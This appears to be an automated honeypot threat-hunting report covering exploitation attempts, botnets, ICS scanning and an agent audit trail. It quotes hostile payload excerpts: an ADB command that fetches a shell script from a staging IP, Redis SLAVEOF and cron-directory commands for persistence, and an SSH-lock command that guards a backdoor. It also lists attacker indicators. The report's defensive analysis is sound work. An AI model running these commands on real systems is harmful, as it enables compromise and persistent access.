# Final Honeypot Threat Hunting Report

## 1) Investigation Scope
- **investigation_start**: 2026-03-17T21:00:05Z
- **investigation_end**: 2026-03-18T00:00:05Z
- **completion_status**: Complete
- **degraded_mode**: False

## 2) Executive Triage Summary
- **Top Services/Ports of Interest**: VNC (5902, 5903, 5904), ADB (5555), Redis (6379), HTTP (80, 443), JetDirect (9100), Kamstrup/Guardian_ast (ICS/Conpot).
- **Top Confirmed Known Exploitation**: CVE-2025-55182 (React2Shell, 63 hits), CVE-2024-14007 (Shenzhen TVT NVMS-9000, 7 hits).
- **Top Unmapped Exploit-like Items**: URL-encoded PHP configuration file enumeration targeting web infrastructure.
- **Botnet/Campaign Mapping Highlights**: 
  - Cross-platform exploitation botnet targeting Redis (cron job persistence) and ADB (shell script staging).
  - Coordinated SSH brute-force campaign utilizing `.ssh` directory locking (`lockr`) to protect persistence mechanisms.
- **Odd/Minutia Services**: Targeted ICS/SCADA protocol enumeration (Kamstrup Meter Protocol) observed on Conpot.

## 3) Candidate Discovery Summary
- **Total Attacks Evaluated**: 19,245
- **Discovery Strategy**: Candidates were extracted utilizing cross-honeypot log aggregation, filtering for high-impact CVEs, specific honeypot behavior (ADB, Redis, Conpot), and unmapped anomalous inputs. 
- **Top Areas of Interest**: ReactServer RCE (React2Shell), TVT NVMS-9000 bypasses, cross-service botnets, SSH persistence tooling, URL-encoded evasion, and ICS/SCADA protocol enumeration.
- **Queue Status**: 8 candidate items were queued and successfully processed through deep investigation and OSINT validation loops. No material errors affected the pipeline.

## 4) Emerging n-day Exploitation
- **CVE-2025-55182 (React2Shell)**
  - **Mapping**: Critical pre-auth RCE in React Server Components.
  - **Evidence Summary**: 63 Suricata alerts (`ET WEB_SPECIFIC_APPS React Server Components React2Shell Unsafe Flight Protocol Property Access`). Primary IP `193.32.162.28` (Unmanaged Ltd, RO) conducted fan-out scanning across non-standard web ports (1025, 2080, 3021, 3443, 4010, 4040, 5004, etc.) probing paths like `/_next`, `/api`, and `/app`.
  - **Affected Service/Port**: HTTP (ports 3000, 1025, 2080, 3021, 3443, 4010, 4040, 5004, 5566, 6600, 30005).
  - **Confidence**: High.
  - **Operational Notes**: Verify environment patches for React Server Components and monitor for successful Flight protocol payloads.

- **CVE-2024-14007 (Shenzhen TVT NVMS-9000)**
  - **Mapping**: High severity authentication bypass in TVT NVMS-9000 firmware.
  - **Evidence Summary**: 7 hits observed from IPs `46.151.178.13` and `91.224.92.125`. 
  - **Affected Service/Port**: NVR/DVR control ports (6036, 6037, 17000, 17001).
  - **Confidence**: High.
  - **Operational Notes**: Specialized botnet/scanner focusing exclusively on video surveillance infrastructure.

## 5) Novel or Zero-Day Exploit Candidates
- **Candidate ID**: NOV-01
  - **Classification**: novel exploit candidate
  - **Novelty Score**: 7 (Reduced to Medium-Low post-OSINT mapping)
  - **Confidence**: Medium
  - **Provisional**: False
  - **Key Evidence**: A single source IP (`185.177.72.23`) recorded 3,894 connections against the Tanner honeypot within a narrow 3-minute window, systematically scanning URL-encoded configuration files (e.g., `/%63onf/%63onfig.php`).
  - **Knownness Checks Performed**: Unmapped to specific CVEs in telemetry. OSINT confirmed this represents generic PHP Config Scanner tooling attempting WAF evasion via hex encoding.
  - **Temporal Checks**: Unavailable.
  - **Required Follow-up**: Monitor for targeted framework identification based on scanned endpoints.

## 6) Botnet/Campaign Infrastructure Mapping
- **Item ID**: BOT-01
  - **Campaign Shape**: Fan-out
  - **Suspected Compromised Source IPs**: `45.205.1.110`
  - **ASNs / Geo Hints**: AS215925 (Vpsvault.host Ltd) / US
  - **Suspected Staging Indicators**: `http://178.16.54.73:80/sifFBrHc.sh` (Shell script staging payload).
  - **Suspected C2 Indicators**: `45.205.1.110:6380` (used as a rogue master node in Redis replication attacks).
  - **Confidence**: High
  - **Operational Notes**: Cross-platform botnet dropping payloads on weakly authenticated services. On Redis, it executes `SLAVEOF 45.205.1.110 6380` and sets directories to `/var/spool/cron/` for persistence. On ADB, it executes `wget` to retrieve the `.sh` script.

- **Item ID**: BOT-02
  - **Campaign Shape**: Spray
  - **Suspected Compromised Source IPs**: `122.177.241.159`, `171.61.22.184`, `196.115.10.13`
  - **ASNs / Geo Hints**: Includes AS24560 (Bharti Airtel Ltd) / India
  - **Suspected Staging Indicators**: None directly recorded. 
  - **Suspected C2 Indicators**: Unknown.
  - **Confidence**: High
  - **Operational Notes**: Coordinated SSH brute-force and persistence campaign. Attackers log into Cowrie, enumerate the system (`uname`, `lscpu`, `crontab -l`), and execute `lockr -ia .ssh` (often combined with `chattr`) to lock the `.ssh` directory and protect their `authorized_keys` backdoor.

## 7) Odd-Service / Minutia Attacks
- **Item ID**: ODD-01
  - **Service Fingerprint**: `kamstrup_protocol` and `guardian_ast` (Conpot)
  - **Why it’s unusual/interesting**: Targeted enumeration of industrial/utility smart meters.
  - **Evidence Summary**: 68 hits for Kamstrup Meter Protocol (KMP) and 21 hits for Guardian AST. The primary IP `193.32.162.28` (which also scanned for React2Shell) was responsible for 40 KMP hits.
  - **Confidence**: High
  - **Recommended Monitoring Pivots**: Monitor ICS/SCADA interfaces. Correlate general web exploitation attempts with OT protocol scanning.

- **Item ID**: ODD-02
  - **Service Fingerprint**: Port 9100 (HP JetDirect/Printer), 18789, 3476
  - **Why it’s unusual/interesting**: Niche ports seeing recurring traffic from centralized ASNs.
  - **Evidence Summary**: IP `185.242.226.14` scanning port 9100.
  - **Confidence**: High
  - **Recommended Monitoring Pivots**: Minimal. OSINT and deep investigation confirm this is the 'Criminal IP Collector' (AI Spera) running benign Internet-wide security research scans.

## 8) Known-Exploit / Commodity Exclusions
- **Commodity VNC Scanning**: Massive volume from the US consisting of 27,420 hits for `GPL INFO VNC server response`. Associated with historical CVE-2006-2369 authentication bypass attempts.
- **MS Terminal Server Scanning**: 2,216 hits for ET SCAN MS Terminal Server Traffic on Non-standard Ports.
- **Commodity Credential Brute Forcing**: Standard SSH/Telnet root and admin brute forcing heavily utilizing `123456`, `1234`, `12345678`, and `root`.
- **Suricata Truncated Packets**: 4,120 hits for IPv4/AF-PACKET truncated packets. OSINT confirms this is typically a localized Suricata MTU/offloading configuration artifact rather than intentional evasion or DoS.

## 9) Infrastructure & Behavioral Classification
- **Exploitation vs Scanning**: High-volume, non-targeted scanning dominates VNC, Terminal Server, and JetDirect ports. Targeted exploitation is sharply focused on Redis (cron persistence), ADB (staging script deployment), and emerging web vulnerabilities (React2Shell).
- **Campaign Shape**: Spray patterns for credential brute forcing and SSH persistence toolkits. Fan-out patterns observed for React2Shell infrastructure mapping and cross-service botnets.
- **Infra Reuse Indicators**: IP `193.32.162.28` (AS47890 Unmanaged Ltd) acts as a heavy multi-purpose scanner, probing both web zero/n-days (React2Shell) and critical infrastructure protocols (Kamstrup).
- **Odd-Service Fingerprints**: IoT/NVR targets (Shenzhen NVMS-9000 on ports 17001/6036) and Utility Meters (KMP).

## 10) Evidence Appendix
- **Candidate: CVE-2025-55182 (React2Shell)**
  - Source IPs: `193.32.162.28`, `91.224.92.177`, `103.118.156.108`, `193.26.115.178`
  - ASNs: 47890 (Unmanaged Ltd)
  - Target Ports: 3000, 1025, 2080, 3021, 3443, 4010, 4040, 5004, 5566, 6600, 30005
  - Paths/Endpoints: `/_next/server`, `/api/route`, `/app`
  - Temporal Checks: Unavailable

- **Candidate: BOT-01 (Cross-Platform Botnet)**
  - Source IPs: `45.205.1.110` (54 hits Redis, 12 hits ADB)
  - ASNs: 215925 (Vpsvault.host Ltd)
  - Target Ports: 6379, 5555
  - Payload Excerpt (ADB): `cd /tmp || cd /var/run; rm -f .s; wget http://178.16.54.73:80/sifFBrHc.sh -O .s ...`
  - Payload Excerpt (Redis): `SLAVEOF 45.205.1.110 6380`, `CONFIG SET dir /var/spool/cron/`
  - Staging Indicators: `http://178.16.54.73:80/sifFBrHc.sh`
  - Temporal Checks: Unavailable

- **Candidate: BOT-02 (SSH lockr Campaign)**
  - Source IPs: `122.177.241.159` (and others)
  - Target Ports: 22 (Cowrie)
  - Payload Excerpt: `lockr -ia .ssh`
  - Temporal Checks: Unavailable

## 11) Indicators of Interest
- **IPs**: 
  - `193.32.162.28` (Multi-purpose exploit/ICS scanner)
  - `45.205.1.110` (Rogue Redis Master / ADB Exploiter)
  - `178.16.54.73` (Malware Staging Server)
  - `185.177.72.23` (Evasive PHP Config Scanner)
  - `46.151.178.13`, `91.224.92.125` (NVR/DVR Exploiters)
- **URLs**: `http://178.16.54.73:80/sifFBrHc.sh`
- **Paths**: `/%63onf/%63onfig.php`
- **Payload Fragments**: `lockr -ia .ssh`

## 12) Backend Tool Issues
- No backend tool failures or query errors were encountered during the investigation loop. The pipeline operated successfully across discovery, validation, and deep investigation without degrading evidence confidence.

## 13) Agent Action Summary (Audit Trail)
- **ParallelInvestigationAgent (and sub-agents)**
  - **Purpose**: Gather baseline metrics, known signals, honeypot specifics, and credential noise.
  - **Inputs Used**: `gte_time_stamp`, `lte_time_stamp`.
  - **Actions Taken**: Executed baseline tools (`get_total_attacks`, `get_top_countries`, `get_attacker_asn`), queried CVE/Alert signatures (`get_alert_signature`, `get_cve`), collected specific honeypot behaviors (`redis_duration_and_bytes`, `adbhoney_input`, `conpot_protocol`, `tanner_unifrom_resource_search`), and retrieved credentials (`get_input_usernames`).
  - **Key Results**: Recorded 19,245 total attacks, 27,420 VNC hits, identified React2Shell and NVMS-9000 signals, and isolated key honeypot behaviors (KMP protocol, Redis cron jobs, Tanner obfuscation).
  - **Errors/Gaps**: None.

- **CandidateDiscoveryAgent**
  - **Purpose**: Identify unmapped behaviors, consolidate signals, and queue potential candidates.
  - **Inputs Used**: State outputs from Parallel agents.
  - **Actions Taken**: Correlated IPs to CVEs (`top_src_ips_for_cve`), extracted 2-level term aggregations (`two_level_terms_aggregated` on inputs/paths), and executed discovery searches (`match_query`, `kibanna_discover_query`, `search`).
  - **Key Results**: Formulated 8 candidates (React2Shell, NVMS-9000, BOT-01, BOT-02, NOV-01, ODD-01, ODD-02, MIN-01) and constructed the Triage Summary model response.
  - **Errors/Gaps**: None.

- **CandidateValidationLoopAgent**
  - **Purpose**: Validate queued candidates using telemetry.
  - **Inputs Used**: Queued candidate list.
  - **Actions Taken**: Iterated through 1 explicitly loaded candidate (CVE-2025-55182) utilizing `suricata_cve_samples` and `kibanna_discover_query`.
  - **Key Results**: Validated CVE-2025-55182 fan-out scanning behavior across multiple web ports and appended it to the validated set.
  - **Errors/Gaps**: Early handoff to Deep Investigation for remaining candidates.

- **DeepInvestigationLoopController**
  - **Purpose**: Pursue tactical leads for candidates and map infrastructure.
  - **Inputs Used**: Validated/Pending candidate state.
  - **Actions Taken**: Executed 6 iterations relying heavily on `first_last_seen_src_ip`, `events_for_src_ip`, `top_http_urls_for_src_ip`, `match_query`, and `search`.
  - **Key Results**: Mapped 193.32.162.28 multi-tooling, correlated 45.205.1.110 cross-service botnet behavior, identified BOT-02 SSH persistence (`lockr`), and mapped ODD-02 to AI Spera. 
  - **Errors/Gaps**: None. Exited successfully on iteration 6.

- **OSINTAgent**
  - **Purpose**: Validate findings against public threat intelligence.
  - **Inputs Used**: Extracted artifacts (`%63onf/%63onfig.php`, `lockr -ia .ssh`, `178.16.54.73`, `kamstrup_protocol`, `AiSpera`).
  - **Actions Taken**: Conducted multiple `search` operations.
  - **Key Results**: Classified NOV-01 as generic PHP Config Scanner tooling, identified the SSH locking campaign, confirmed Kamstrup protocol legitimacy, mapped ODD-02 to benign scanning, and attributed MIN-01 (truncated packets) to internal MTU configurations.
  - **Errors/Gaps**: None.

- **ReportAgent**
  - **Purpose**: Compile finalized investigation markdown report.
  - **Inputs Used**: Entirely derived from the workflow state, OSINT feedback, and deep investigation leads.
  - **Actions Taken**: Formatting and synthesizing data into standard operational format.
  - **Key Results**: Generated final markdown report.
  - **Errors/Gaps**: None.

- **SaveReportAgent**
  - **Purpose**: Write report to disk.
  - **Inputs Used**: Markdown text.
  - **Actions Taken**: Executing `default_api:deep_agent_write_file`.
  - **Key Results**: Report saved.
  - **Errors/Gaps**: None.
